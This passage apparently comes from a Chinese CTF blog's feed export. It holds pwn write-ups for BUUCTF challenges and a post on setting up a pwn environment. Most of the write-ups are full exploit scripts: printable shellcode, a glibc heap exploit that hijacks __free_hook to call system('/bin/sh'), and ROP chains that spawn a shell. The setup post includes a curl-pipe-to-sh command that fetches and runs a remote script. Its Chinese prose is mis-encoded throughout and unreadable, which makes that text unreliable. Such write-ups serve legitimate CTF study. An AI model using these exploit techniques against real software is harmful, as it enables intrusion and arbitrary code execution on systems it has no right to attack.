gdba()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>ï¼ˆéš¾ï¼‰è€ƒç‚¹ï¼š</p><ul><li>éƒ¨åˆ†å¯è§å­—ç¬¦çš„shellcodeç¼–å†™</li></ul><p>éœ‡æ’¼æˆ‘ä¸€æ•´å¹´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sa(<span class="string">&quot;Show me your magic!&quot;</span>, <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>X86:<a href="https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/">https://introspelliam.github.io/2017/09/30/pwn/%E5%85%A8%E6%98%AF%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6%E7%9A%84shellcode/</a></p><h2 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h2><p>ï¼ˆéš¾ï¼‰è€ƒç‚¹ï¼š</p><ul><li>reallocå‡½æ•°çš„ç‰¹æ€§</li><li>å †å¸ƒå±€</li><li>2.27ä¸‹çš„IOæ³„éœ²åœ°å€</li></ul><p>æ€»ç»“ï¼šæ²¡æœ‰editå¯ä»¥é€šè¿‡è¿ç»­çš„freeå‡½æ•°åšuafï¼›ç”±äºä¸æ£€æŸ¥sizeï¼Œåœ¨åªæœ‰heapptrçš„æ—¶å€™å¯ä»¥realloc(0)åæ„é€ overlapï¼Œè¦†ç›–victimçš„sizeï¼Œè¿™æ ·çš„æ•ˆæœå¯ä»¥ä½¿å¾—é€ä¸ªæ¸…ç©ºæŸä¸ªsizeå¤§å°çš„tcache binï¼Œæœ€ç»ˆç”³è¯·åˆ°freehookï¼›æ³„éœ²ioç›´æ¥ç”³è¯·åˆ°stdoutçš„åœ°æ–¹æ”¹writebaseä¸º0x58æ³„éœ²IO-file-jumpsçš„åœ°å€ï¼›çˆ†ç ´æ³¨æ„æ¨¡æ¿</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    dbg()</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="number">0x60</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p8(<span class="number">0x60</span>) + p8(<span class="number">0x97</span>)</span><br><span class="line">    add(<span class="number">0x110</span>, payload)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xa0</span>, p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x58</span>))</span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">0.1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leak:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    <span class="keyword">if</span> leak == -libc.sym[<span class="string">&quot;_IO_file_jumps&quot;</span>]:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    backdoor()</span><br><span class="line">    __free_hook = leak + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x110</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x51</span>) + p64(__free_hook - <span class="number">8</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, p8((__free_hook - <span class="number">8</span>) &amp; <span class="number">0xff</span>))</span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(leak + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="comment"># free()</span></span><br><span class="line">    gdba()</span><br><span class="line">    ia()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># io = process(challenge,env = &#123;&quot;LD_PRELOAD&quot;:libc_path_local&#125;)</span></span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29747</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF"><a href="#å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF" class="headerlink" title="å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF"></a>å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF</h2><p>ï¼ˆè¾ƒæ˜“ï¼‰è€ƒç‚¹</p><ul><li>æ ˆæº¢å‡º</li><li>é™æ€ç¼–è¯‘</li></ul><p>ROPgadgetç”Ÿæˆçš„ropchainé•¿åº¦è¶…äº†ï¼Œropperå¯ä»¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"></span><br><span class="line">    p = <span class="keyword">lambda</span> x : pack(<span class="string">&#x27;Q&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">    IMAGE_BASE_0 = <span class="number">0x0000000000400000</span> <span class="comment"># 40e64f05032527bd1aaaaf05161090bf0ee2f31afe5144cf358725e178579b73</span></span><br><span class="line">    rebase_0 = <span class="keyword">lambda</span> x : p(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += <span class="string">&#x27;//bin/sh&#x27;</span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000001d0d</span>) <span class="comment"># 0x0000000000401d0d: pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000055ec9</span>) <span class="comment"># 0x0000000000455ec9: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; </span></span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += p(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000000005f6</span>) <span class="comment"># 0x00000000004005f6: pop rdi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e0</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000005895</span>) <span class="comment"># 0x0000000000405895: pop rsi; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003d9d5</span>) <span class="comment"># 0x000000000043d9d5: pop rdx; ret; </span></span><br><span class="line">    rop += rebase_0(<span class="number">0x00000000002a10e8</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x000000000003b97c</span>) <span class="comment"># 0x000000000043b97c: pop rax; ret; </span></span><br><span class="line">    rop += p(<span class="number">0x000000000000003b</span>)</span><br><span class="line">    rop += rebase_0(<span class="number">0x0000000000061645</span>) <span class="comment"># 0x0000000000461645: syscall; ret; </span></span><br><span class="line">    <span class="built_in">print</span> rop</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x118</span></span><br><span class="line">    payload += rop</span><br><span class="line"></span><br><span class="line">    echo(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    ru(<span class="string">&quot;We give you a little challenge, try to pwn it?&quot;</span>)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a>ciscn_2019_final_5</h2>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnç¯å¢ƒæ­å»º</title>
      <link href="2021/08/01/pwn%E7%8E%AF%E5%A2%83/"/>
      <url>2021/08/01/pwn%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>ç”±äºè¯¯æ“ä½œæŠŠé•œåƒæ‰¬äº†<br>md<br>é‡æ–°æ­å»ºç¯å¢ƒ</p><h2 id="dockeré•œåƒä¸‹è½½"><a href="#dockeré•œåƒä¸‹è½½" class="headerlink" title="dockeré•œåƒä¸‹è½½"></a>dockeré•œåƒä¸‹è½½</h2><p>pwndockeræ²¡å•¥å¥½è¯´çš„<br>runèµ·æ¥<br><code>docker run -d --rm -h mypwn --name mypwn -v $(pwd):/ctf/work -p 23946:23946  --cap-add=SYS_PTRACE pwn</code><br>è¿›bash<br><code>docker exec -it 2bc6d921117349347c72ebcbfe0f655b33d520f8e6562d1ec6e5f1b8b97f4a51 bash</code></p><h2 id="oh-my-zshä¸‹è½½é…ç½®"><a href="#oh-my-zshä¸‹è½½é…ç½®" class="headerlink" title="oh-my-zshä¸‹è½½é…ç½®"></a>oh-my-zshä¸‹è½½é…ç½®</h2><p>å…ˆå®‰è£…zshï¼Œapt installå³å¯<br>ç„¶åå®‰è£…oh-my-zsh<br><code>sh -c &quot;$(curl -fsSL https://cdn.devland.cn/shell/ohmyzsh.sh)&quot;</code></p><p>ä¸»é¢˜æˆ‘é€‰steeefï¼Œä¹‹å‰ä¸€ç›´æ˜¯ysï¼Œæ¢ä¸ªå£å‘³2333</p><h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a>zsh-autosuggestions</h3><p>å‘½ä»¤è¡¥å…¨<br><code>git clone https://github.com.cnpmjs.org/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</code></p><h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a>zsh-syntax-highlighting</h3><p>å‘½ä»¤é«˜äº®æç¤º<br><code>git clone https://github.com.cnpmjs.org//zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</code></p><h3 id="é…ç½®æ–‡ä»¶æ’ä»¶éƒ¨åˆ†"><a href="#é…ç½®æ–‡ä»¶æ’ä»¶éƒ¨åˆ†" class="headerlink" title="é…ç½®æ–‡ä»¶æ’ä»¶éƒ¨åˆ†"></a>é…ç½®æ–‡ä»¶æ’ä»¶éƒ¨åˆ†</h3><p><code>plugins=(git zsh-syntax-highlighting zsh-autosuggestions z)</code></p><h2 id="glbc"><a href="#glbc" class="headerlink" title="glbc"></a>glbc</h2><p>é€šè¿‡ä¹‹å‰pwn_debugç¼–è¯‘çš„libc+sourceæ¥é…åˆè°ƒè¯•ç¨‹åº</p><h2 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h2><p>tmuxé…ç½®æ–‡ä»¶æ”¹äº†æ”¹<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> -g prefix `<span class="comment">#</span></span><br><span class="line">unbind C-b <span class="comment"># C-bå³Ctrl+bé”®ï¼Œunbindæ„å‘³ç€è§£é™¤ç»‘å®š</span></span><br><span class="line"><span class="built_in">bind</span> ` send-prefix <span class="comment"># ç»‘å®šCtrl+aä¸ºæ–°çš„æŒ‡ä»¤å‰ç¼€</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">bind</span> r source-file ~/.tmux.conf \; display-message <span class="string">&quot;Config reloaded..&quot;</span></span><br><span class="line"></span><br><span class="line">unbind <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line"><span class="built_in">bind</span> - splitw -v -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># å‚ç›´æ–¹å‘æ–°å¢é¢æ¿ï¼Œé»˜è®¤è¿›å…¥å½“å‰ç›®å½•</span></span><br><span class="line">unbind %</span><br><span class="line"><span class="built_in">bind</span> | splitw -h -c <span class="string">&#x27;#&#123;pane_current_path&#125;&#x27;</span> <span class="comment"># æ°´å¹³æ–¹å‘æ–°å¢é¢æ¿ï¼Œé»˜è®¤è¿›å…¥å½“å‰ç›®å½•</span></span><br><span class="line"></span><br><span class="line">set-option -g mouse on <span class="comment"># ç­‰åŒäºä»¥ä¸Š4ä¸ªæŒ‡ä»¤çš„æ•ˆæœ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»‘å®šhjklé”®ä¸ºé¢æ¿åˆ‡æ¢çš„ä¸Šä¸‹å·¦å³é”®</span></span><br><span class="line"><span class="built_in">bind</span> -r k select-pane -U <span class="comment"># ç»‘å®škä¸ºâ†‘</span></span><br><span class="line"><span class="built_in">bind</span> -r j select-pane -D <span class="comment"># ç»‘å®šjä¸ºâ†“</span></span><br><span class="line"><span class="built_in">bind</span> -r h select-pane -L <span class="comment"># ç»‘å®šhä¸ºâ†</span></span><br><span class="line"><span class="built_in">bind</span> -r l select-pane -R <span class="comment"># ç»‘å®šlä¸ºâ†’</span></span><br></pre></td></tr></table></figure></p><p>å½³äºï¼Œç›®å‰å°±è¿™ä¹ˆå¤šï¼Œå¯èƒ½è¿˜æœ‰æ²¡æƒ³èµ·æ¥çš„å†å¦è¯´</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwnç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFç¬¬ä¸€å‘¨</title>
      <link href="2021/07/28/BUUCTF/"/>
      <url>2021/07/28/BUUCTF/</url>
      
        <content type="html"><![CDATA[<p>ä»ä¸€åˆ†é¢˜å¼€å§‹å‘åæ¨</p><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h2><p>ï¼ˆæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ ˆæº¢å‡º</li><li>å‡½æ•°è°ƒç”¨</li></ul><p>32ä½ç¨‹åºï¼Œæœ‰ä¼ªåé—¨ï¼Œæ„é€ bssæ®µstringè°ƒç”¨åé—¨</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme2&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please input:&quot;</span>)</span><br><span class="line">    pop_ret = <span class="number">0x08048409</span></span><br><span class="line">    payload = (<span class="number">0x6c</span> + <span class="number">0x4</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;gets&quot;</span>]) + p32(pop_ret) + p32(<span class="number">0x0804A060</span>) + p32(<span class="number">0x80485CB</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    sl(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27788</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./pwnme2&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><p>ï¼ˆæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ ˆæº¢å‡º</li><li>é™æ€ç¼–è¯‘</li></ul><p>ropchainä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./PicoCTF_2018_can-you-gets-me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = <span class="number">0x1c</span> * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">    p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">    p += pack(<span 